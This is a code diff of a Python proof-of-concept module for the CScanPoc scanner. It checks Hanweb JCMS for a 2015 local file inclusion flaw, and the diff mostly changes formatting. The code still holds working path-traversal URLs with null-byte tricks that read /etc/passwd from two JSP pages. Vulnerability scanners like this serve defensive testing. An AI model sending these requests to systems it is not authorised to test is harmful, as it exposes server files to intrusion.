@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Hanweb_0013' # 平台漏洞编号，留空
+    vuln_id = 'Hanweb_0013'  # 平台漏洞编号，留空
     name = '大汉JCMS 任意文件包含'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.LFI # 漏洞类型
+    type = VulnType.LFI  # 漏洞类型
     disclosure_date = '2015-05-29'  # 漏洞公布时间
     desc = '''
         大汉科技（Hanweb）大汉JCMS，漏洞文件地址：
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Hanweb(大汉)'  # 漏洞应用名称
     product_version = '大汉JCMS'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '304b65bc-f8e0-4632-a4ab-469794a17f0d'
@@ -32,17 +34,17 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-    
-            #refer     :  http://www.wooyun.org/bugs/wooyun-2015-0148311
-            ##refer     :  http://www.wooyun.org/bugs/wooyun-2015-0116997
+
+            # refer     :  http://www.wooyun.org/bugs/wooyun-2015-0148311
+            # refer     :  http://www.wooyun.org/bugs/wooyun-2015-0116997
             hh = hackhttp.hackhttp()
-            arg = self.target       
+            arg = self.target
             url = arg + '/lm/front/mailwrite_over.jsp?editpagename=/../../../../../../../../../../../../../etc/passwd%00.ftl'
             url2 = arg + '/lm/front/reg_2.jsp?sysid=/../../../../../../../../../../../../../etc/passwd%00%23'
             code, head, res, errcode, _ = hh.http(url)
             code2, head2, res2, errcode2, _ = hh.http(url2)
 
-            if code2==200 and re.search('root', res2):
+            if code2 == 200 and re.search('root', res2):
                 #security_hole(url2+'  大汉cms任意文件包含')
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -52,6 +54,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
